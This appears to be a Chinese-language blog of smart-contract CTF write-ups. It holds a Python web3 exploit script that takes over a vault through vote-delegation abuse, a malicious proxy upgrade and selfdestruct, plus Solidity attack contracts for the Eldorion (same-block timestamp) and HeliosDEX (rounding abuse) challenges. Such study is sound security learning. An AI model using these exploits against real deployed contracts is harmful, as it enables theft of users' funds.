    signed_txn = w3.eth.account.sign_transaction(transaction, privKey)
    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return receipt

def transfer(to, amount):
    tx = {
        "from": account.address,
        "to": to,
        "value": amount,
        "gas": 500000,
        "gasPrice": w3.eth.gas_price,
        "nonce": w3.eth.get_transaction_count(account.address),
    }

    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return receipt

def main():
    print(f"Connected to network. Chain ID: {w3.eth.chain_id}")
    print(f"Using account: {account.address}")

    _solc_version = "0.8.13"
    solcx.set_solc_version(_solc_version)
    # Contract ABIs
    challenge = w3.eth.contract(
        address=CHALLENGE_ADDRESS,
        abi=[
            {
                "inputs": [],
                "name": "claim",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "player", "type": "address"}
                ],
                "stateMutability": "nonpayable",
                "type": "constructor",
            },
            {
                "inputs": [],
                "name": "diamond",
                "outputs": [
                    {"internalType": "contract Diamond", "name": "", "type": "address"}
                ],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "DIAMONDS",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "HEXENS_COINS",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "hexensCoin",
                "outputs": [
                    {
                        "internalType": "contract HexensCoin",
                        "name": "",
                        "type": "address",
                    }
                ],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "isSolved",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "PLAYER",
                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "vault",
                "outputs": [
                    {"internalType": "contract Vault", "name": "", "type": "address"}
                ],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "vaultFactory",
                "outputs": [
                    {
                        "internalType": "contract VaultFactory",
                        "name": "",
                        "type": "address",
                    }
                ],
                "stateMutability": "view",
                "type": "function",
            },
        ],
    )

    # Get contract addresses
    hexens_coin_addr = challenge.functions.hexensCoin().call()
    vault_addr = challenge.functions.vault().call()
    vaultFactory_addr = challenge.functions.vaultFactory().call()

    print(f"HexensCoin address: {hexens_coin_addr}")
    print(f"Vault address: {vault_addr}")
    print(f"VaultFactory address: {vaultFactory_addr}")

    hexens_coin = w3.eth.contract(
        address=hexens_coin_addr,
        abi=[
            {
                "type": "function",
                "name": "delegate",
                "inputs": [
                    {"name": "delegatee", "type": "address", "internalType": "address"}
                ],
                "outputs": [],
                "stateMutability": "nonpayable",
            },
            {
                "type": "function",
                "name": "transfer",
                "inputs": [
                    {"name": "to", "type": "address", "internalType": "address"},
                    {"name": "amount", "type": "uint256", "internalType": "uint256"},
                ],
                "outputs": [{"name": "", "type": "bool", "internalType": "bool"}],
                "stateMutability": "nonpayable",
            },
            {
                "type": "function",
                "name": "balanceOf",
                "inputs": [
                    {"name": "account", "type": "address", "internalType": "address"}
                ],
                "outputs": [{"name": "", "type": "uint256", "internalType": "uint256"}],
                "stateMutability": "view",
            },
            {
                "type": "function",
                "name": "getCurrentVotes",
                "inputs": [
                    {"name": "account", "type": "address", "internalType": "address"}
                ],
                "outputs": [{"name": "", "type": "uint256", "internalType": "uint256"}],
                "stateMutability": "view",
            },
        ],
    )

    vault = w3.eth.contract(
        address=vault_addr,
        abi=[
            {
                "inputs": [{"internalType": "bytes", "name": "data", "type": "bytes"}],
                "name": "governanceCall",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function",
            },
        ],
    )

    diamond_addr = challenge.functions.diamond().call()
    print(f"Diamond address: {diamond_addr}")
    diamond_addr = challenge.functions.diamond().call()
    diamond = w3.eth.contract(
        address=diamond_addr,
        abi=[
            {
                "inputs": [
                    {
                        "internalType": "uint256",
                        "name": "totalSupply_",
                        "type": "uint256",
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "constructor",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "owner", "type": "address"},
                    {"internalType": "address", "name": "spender", "type": "address"},
                    {"internalType": "uint256", "name": "value", "type": "uint256"},
                ],
                "name": "Approval",
                "type": "event",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "from", "type": "address"},
                    {"internalType": "address", "name": "to", "type": "address"},
                    {"internalType": "uint256", "name": "value", "type": "uint256"},
                ],
                "name": "Transfer",
                "type": "event",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "owner", "type": "address"},
                    {"internalType": "address", "name": "spender", "type": "address"},
                ],
                "name": "allowance",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "spender", "type": "address"},
                    {"internalType": "uint256", "name": "amount", "type": "uint256"},
                ],
                "name": "approve",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "account", "type": "address"}
                ],
                "name": "balanceOf",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "decimals",
                "outputs": [{"internalType": "uint8", "name": "", "type": "uint8"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "spender", "type": "address"},
                    {
                        "internalType": "uint256",
                        "name": "subtractedValue",
                        "type": "uint256",
                    },
                ],
                "name": "decreaseAllowance",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "spender", "type": "address"},
                    {
                        "internalType": "uint256",
                        "name": "addedValue",
                        "type": "uint256",
                    },
                ],
                "name": "increaseAllowance",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "name",
                "outputs": [{"internalType": "string", "name": "", "type": "string"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "symbol",
                "outputs": [{"internalType": "string", "name": "", "type": "string"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "totalSupply",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "to", "type": "address"},
                    {"internalType": "uint256", "name": "amount", "type": "uint256"},
                ],
                "name": "transfer",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "from", "type": "address"},
                    {"internalType": "address", "name": "to", "type": "address"},
                    {"internalType": "uint256", "name": "amount", "type": "uint256"},
                ],
                "name": "transferFrom",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function",
            },
        ],
    )
    vaultFactory = w3.eth.contract(
        address=vaultFactory_addr,
        abi=[
            {
                "inputs": [
                    {"internalType": "bytes32", "name": "salt_", "type": "bytes32"}
                ],
                "name": "createVault",
                "outputs": [
                    {"internalType": "contract Vault", "name": "", "type": "address"}
                ],
                "stateMutability": "nonpayable",
                "type": "function",
            }
        ],
    )

    print(f"Diamond balance: {diamond.functions.balanceOf(vault_addr).call() = }")
    print("Transferring tokens to accounts...")
    accounts = [
        [Account.from_key(f"0x{hex(i)[2:]:0>64}"), f"0x{hex(i)[2:]:0>64}"]
        for i in range(1, 12)
    ]
    for i in accounts:
        transfer(i[0].address, 10000000000000000)
        print(f"Transferred 10^16 tokens to {i[0].address}")

    # 1. Claim initial tokens
    print("\nClaiming initial tokens...")
    send_transaction(
        challenge.functions.claim(), accounts[0][0], privKey=accounts[0][1]
    )
    balance = hexens_coin.functions.balanceOf(accounts[0][0].address).call()
    print(f"Balance of account 0: {balance}")

    # 2. attack
    print("\nAttacking...")
    if (
        int(hexens_coin.functions.getCurrentVotes(account.address).call())
        < 100000000000000000000000
    ):
        for i in range(10):
            send_transaction(
                hexens_coin.functions.delegate(account.address),
                accounts[i][0],
                privKey=accounts[i][1],
            )
            send_transaction(
                hexens_coin.functions.transfer(
                    accounts[i + 1][0].address, 10000000000000000000000
                ),
                accounts[i][0],
                privKey=accounts[i][1],
            )
            currentVote = hexens_coin.functions.getCurrentVotes(account.address).call()
            print(f"Current votes of account: {currentVote}")

    def deploy_contract(w3, x_abi, x_bin):
        construct_txn = (
            w3.eth.contract(abi=x_abi, bytecode=x_bin)
            .constructor(diamond_addr, hexens_coin_addr)
            .build_transaction(
                {
                    "from": account.address,
                    "nonce": w3.eth.get_transaction_count(account.address),
                }
            )
        )
        tx_create = w3.eth.account.sign_transaction(construct_txn, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"Contract deployed at address: { tx_receipt.contractAddress }")

        return tx_receipt.contractAddress

    x_meta = solcx.compile_files(
        ["x.sol"], output_values=["abi", "bin"], solc_version=_solc_version
    )
    x_abi = x_meta["x.sol:X"]["abi"]
    x_bin = x_meta["x.sol:X"]["bin"]
    x_address = deploy_contract(w3, x_abi, x_bin)
    # x_address = "0xaDFF41E489b5517A26bb2AbF3bE6c960740D4E09"

    # x_instance = w3.eth.contract(address=x_address, abi=x_abi)
    dark_vault = w3.eth.contract(address=vault_addr, abi=x_abi)

    governance_call_function = "governanceCall(bytes)"
    burn_function_signature = "burn(address,uint256)"
    burn_function_signature
    upgradeTo_function_signature = "upgradeTo(address)"
    # Encode the "burn" function calldata
    amount = 31337
    burn_function_selector = w3.keccak(text=burn_function_signature)[
        :4
    ]  # First 4 bytes of the function selector
    encoded_token = w3.to_bytes(
        hexstr=w3.to_checksum_address(diamond_addr)[2:].zfill(64)
    )  # Address encoded to 32 bytes
    encoded_amount = amount.to_bytes(32, byteorder="big")  # Amount encoded to 32 bytes

    calldata = burn_function_selector + encoded_token + encoded_amount
    send_transaction(vault.functions.governanceCall(calldata), account)

    print(f"Diamond balance: {diamond.functions.balanceOf(vault_addr).call() = }")

    # Encode the "upgradeTo" function
    upgradeTo_function_selector = w3.keccak(text=upgradeTo_function_signature)[
        :4
    ]  # First 4 bytes of the function selector
    encoded_token = w3.to_bytes(
        hexstr=w3.to_checksum_address(x_address)[2:].zfill(64)
    )  # Address encoded to 32 bytes

    calldata = upgradeTo_function_selector + encoded_token
    send_transaction(vault.functions.governanceCall(calldata), account)
    # Selfdestruct the vault
    send_transaction(dark_vault.functions._selfdestruct(), account)

    # Create a new vault using vaultFactory
    salt_ = w3.solidity_keccak(
        ["string"],
        ["The tea in Nepal is very hot. But the coffee in Peru is much hotter."],
    )
    send_transaction(vaultFactory.functions.createVault(salt_), account)

    # Initialization, and we can gain ownership of the vault, no need to attack again
    send_transaction(
        dark_vault.functions.initialize(diamond_addr, hexens_coin_addr), account
    )
    # Upgrade to the dark vault again
    send_transaction(vault.functions.governanceCall(calldata), account)

    # Gain diamonds!
    send_transaction(dark_vault.functions.new_sender(), account)

if __name__ == "__main__":
    main()
```

# 2025-08-04

太久没学Web3了，今天作为打卡第一天，先稍微做点简单题热身一下吧

下面是来源于Cyber Apocalypse CTF 2025的签到题Eldorion：

```solidity
// Eldorion.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Eldorion {
    uint256 public health = 300;
    uint256 public lastAttackTimestamp;
    uint256 private constant MAX_HEALTH = 300;
    
    event EldorionDefeated(address slayer);
    
    modifier eternalResilience() {
        if (block.timestamp > lastAttackTimestamp) {
            health = MAX_HEALTH;
            lastAttackTimestamp = block.timestamp;
        }
        _;
    }
    
    function attack(uint256 damage) external eternalResilience {
        require(damage <= 100, "Mortals cannot strike harder than 100");
        require(health >= damage, "Overkill is wasteful");
        health -= damage;
        
        if (health == 0) {
            emit EldorionDefeated(msg.sender);
        }
    }

    function isDefeated() external view returns (bool) {
        return health == 0;
    }
}

// Setup.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Eldorion } from "./Eldorion.sol";

contract Setup {
    Eldorion public immutable TARGET;
    
    event DeployedTarget(address at);

    constructor() payable {
        TARGET = new Eldorion();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return TARGET.isDefeated();
    }
}

```

由题意我们可以知道我们需要击败300血的Eldorion，但是每次攻击最多只能攻击100点血量，而且每次攻击会将上次攻击时间和本次攻击时间进行比对，如果本次攻击时间大于上次攻击时间则Eldorion会回满血

看起来这就是一个无底洞，但是我们可以轻松发现记录攻击时间使用的是`block.timestamp`，即区块生成时间，因此我们只需要让多次攻击处于同一区块内就可以绕过时间检测，同时需要注意不要Overkill，否则攻击会失败

```solidity
// attack.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IEldorion {
    function attack(uint256 damage) external;
    function isDefeated() external view returns (bool);
}

contract Attack{
    IEldorion public eldorion;
    constructor(address _eldorion){
        eldorion = IEldorion(_eldorion);
    }

    function attack() public{
        for(uint8 i=0; i<3; i++){
            eldorion.attack(100);
        }
        require(eldorion.isDefeated(), "Failed to solve the problem");
    }
}
```

部署后调用`attack()`即可完成本题

是不是有点太水了，那就接着再水一题吧，是同一个CTF的第2题HeliosDEX：

```solidity
// HeliosDEX.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

/***
    __  __     ___            ____  _______  __
   / / / /__  / (_)___  _____/ __ \/ ____/ |/ /
  / /_/ / _ \/ / / __ \/ ___/ / / / __/  |   / 
 / __  /  __/ / / /_/ (__  ) /_/ / /___ /   |  
/_/ /_/\___/_/_/\____/____/_____/_____//_/|_|  
                                               
    Today's item listing:
    * Eldorion Fang (ELD): A shard of a Eldorion's fang, said to imbue the holder with courage and the strength of the ancient beast. A symbol of valor in battle.
    * Malakar Essence (MAL): A dark, viscous substance, pulsing with the corrupted power of Malakar. Use with extreme caution, as it whispers promises of forbidden strength. MAY CAUSE HALLUCINATIONS.
    * Helios Lumina Shards (HLS): Fragments of pure, solidified light, radiating the warmth and energy of Helios. These shards are key to powering Eldoria's invisible eye.
***/

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

contract EldorionFang is ERC20 {
    constructor(uint256 initialSupply) ERC20("EldorionFang", "ELD") {
        _mint(msg.sender, initialSupply);
    }
}

contract MalakarEssence is ERC20 {
    constructor(uint256 initialSupply) ERC20("MalakarEssence", "MAL") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosLuminaShards is ERC20 {
    constructor(uint256 initialSupply) ERC20("HeliosLuminaShards", "HLS") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosDEX {
    EldorionFang public eldorionFang;
    MalakarEssence public malakarEssence;
    HeliosLuminaShards public heliosLuminaShards;

    uint256 public reserveELD;
    uint256 public reserveMAL;
    uint256 public reserveHLS;
    
    uint256 public immutable exchangeRatioELD = 2;
    uint256 public immutable exchangeRatioMAL = 4;
    uint256 public immutable exchangeRatioHLS = 10;

    uint256 public immutable feeBps = 25;

    mapping(address => bool) public hasRefunded;

    bool public _tradeLock = false;
    
    event HeliosBarter(address item, uint256 inAmount, uint256 outAmount);
    event HeliosRefund(address item, uint256 inAmount, uint256 ethOut);

    constructor(uint256 initialSupplies) payable {
        eldorionFang = new EldorionFang(initialSupplies);
        malakarEssence = new MalakarEssence(initialSupplies);
        heliosLuminaShards = new HeliosLuminaShards(initialSupplies);
        reserveELD = initialSupplies;
        reserveMAL = initialSupplies;
        reserveHLS = initialSupplies;
    }

    modifier underHeliosEye {
        require(msg.value > 0, "HeliosDEX: Helios sees your empty hand! Only true offerings are worthy of a HeliosBarter");
        _;
    }

    modifier heliosGuardedTrade() {
        require(_tradeLock != true, "HeliosDEX: Helios shields this trade! Another transaction is already underway. Patience, traveler");
        _tradeLock = true;
        _;
        _tradeLock = false;
    }

    function swapForELD() external payable underHeliosEye {
        uint256 grossELD = Math.mulDiv(msg.value, exchangeRatioELD, 1e18, Math.Rounding(0));
        uint256 fee = (grossELD * feeBps) / 10_000;
        uint256 netELD = grossELD - fee;

        require(netELD <= reserveELD, "HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveELD -= netELD;
        eldorionFang.transfer(msg.sender, netELD);

        emit HeliosBarter(address(eldorionFang), msg.value, netELD);
    }

    function swapForMAL() external payable underHeliosEye {
        uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1));
        uint256 fee = (grossMal * feeBps) / 10_000;
        uint256 netMal = grossMal - fee;

        require(netMal <= reserveMAL, "HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveMAL -= netMal;
        malakarEssence.transfer(msg.sender, netMal);

        emit HeliosBarter(address(malakarEssence), msg.value, netMal);
    }

    function swapForHLS() external payable underHeliosEye {
        uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3));
        uint256 fee = (grossHLS * feeBps) / 10_000;
        uint256 netHLS = grossHLS - fee;
        
        require(netHLS <= reserveHLS, "HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
        

        reserveHLS -= netHLS;
        heliosLuminaShards.transfer(msg.sender, netHLS);

        emit HeliosBarter(address(heliosLuminaShards), msg.value, netHLS);
    }

    function oneTimeRefund(address item, uint256 amount) external heliosGuardedTrade {
        require(!hasRefunded[msg.sender], "HeliosDEX: refund already bestowed upon thee");
        require(amount > 0, "HeliosDEX: naught for naught is no trade. Offer substance, or be gone!");

        uint256 exchangeRatio;
        
        if (item == address(eldorionFang)) {
            exchangeRatio = exchangeRatioELD;
            require(eldorionFang.transferFrom(msg.sender, address(this), amount), "ELD transfer failed");
            reserveELD += amount;
        } else if (item == address(malakarEssence)) {
            exchangeRatio = exchangeRatioMAL;
            require(malakarEssence.transferFrom(msg.sender, address(this), amount), "MAL transfer failed");
            reserveMAL += amount;
        } else if (item == address(heliosLuminaShards)) {
            exchangeRatio = exchangeRatioHLS;
            require(heliosLuminaShards.transferFrom(msg.sender, address(this), amount), "HLS transfer failed");
            reserveHLS += amount;
        } else {
            revert("HeliosDEX: Helios descries forbidden offering");
        }

        uint256 grossEth = Math.mulDiv(amount, 1e18, exchangeRatio);

        uint256 fee = (grossEth * feeBps) / 10_000;
        uint256 netEth = grossEth - fee;

        hasRefunded[msg.sender] = true;
        payable(msg.sender).transfer(netEth);
        
        emit HeliosRefund(item, amount, netEth);
    }
}


// Setup.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

import { HeliosDEX } from "./HeliosDEX.sol";

contract Setup {
    HeliosDEX public TARGET;
    address public player;
    
    event DeployedTarget(address at);

    constructor(address _player) payable {
        TARGET = new HeliosDEX{value: 1000 ether}(1000);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return player.balance >= 20 ether;
    }
}
```

> 由于比赛已经过了很久了，我也不知道自己手上有多少初始ETH，假定是0.1ETH吧，同时为了方便在Remix调试（我懒得自己搓一个Foundry script了），稍微降低一下Setup中的参数，最终根据实际情况预定是传入99 ether（考虑到gas费无法传入100 ether），初始参数同样设置为99，`isSolved`等比修改为2 ether

这题提供了一个能交换3种ERC20的DEX，每种代币都有其独特的汇率，最后的refund只能兑换1种代币，从合约来看自然是HLS汇率最好，能和ETH达到1:0.1的汇率；除此之外，兑换代币和refund的时候都会收取2.5‰的手续费

观察一下合约，refund被一个reentrancy guard修饰，且只有该函数能转出ETH，因此重入攻击打不了，所以想解题只能尽可能多兑换代币

观察三种代币的兑换方式，我们发现它们都使用了OZ的`mulDiv`函数，但是其参数中的`Math.Rounding`十分可疑，因此我们查看OZ的合约源码：

```solidity
library Math {
    enum Rounding {
        Floor, // Toward negative infinity
        Ceil, // Toward positive infinity
        Trunc, // Toward zero
        Expand // Away from zero
    }
    // ...
}
```

那么我们会发现兑换ELD，MAL，HLS时，计算得到的代币数量分别会向下取整，向上取整，向上取整（由于不可能兑换负数个代币），因此我们可以仅使用1 wei兑换1个MAL或者1个HLS；同时由于整数除法导致的精度损失，我们兑换代币的数量只要不到400，就能忽略手续费，因此我们可以编写如下的攻击合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IHeliosDEX{
    function swapForHLS() external payable;
    function oneTimeRefund(address item, uint256 amount) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Attack {
    IHeliosDEX public dex;
    constructor(address _dex) {
        dex = IHeliosDEX(_dex);
    }

    function attack(address item) public payable{
        uint iterations = msg.value;
        require(iterations > 80, "Too less iterations");
        for(uint i=0; i<iterations; i++){
            dex.swapForHLS{value: 1 wei}();
        }
        IERC20(item).approve(address(dex), iterations);
        dex.oneTimeRefund(item, iterations);
        refund();
        require(msg.sender.balance > 2 ether, "Failed to solve this problem");
    }

    function refund() internal{
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

> 需要注意一下，对于原题，使用for循环可能导致gas费消耗问题，可以稍微更改一下，此处仅作为思路提供
>
> 同时在最后进行refund前需要首先向DEX进行Approve操作，否则DEX的`transferFrom`会失败导致revert，同时由于转钱是转给`msg.sender`，因此需要给合约添加`receive()`函数接收转账，并添加提款函数提走合约内的资金以完成本题

行吧，就这样了，开摆~


# 2025.07.30


<!-- Content_END -->
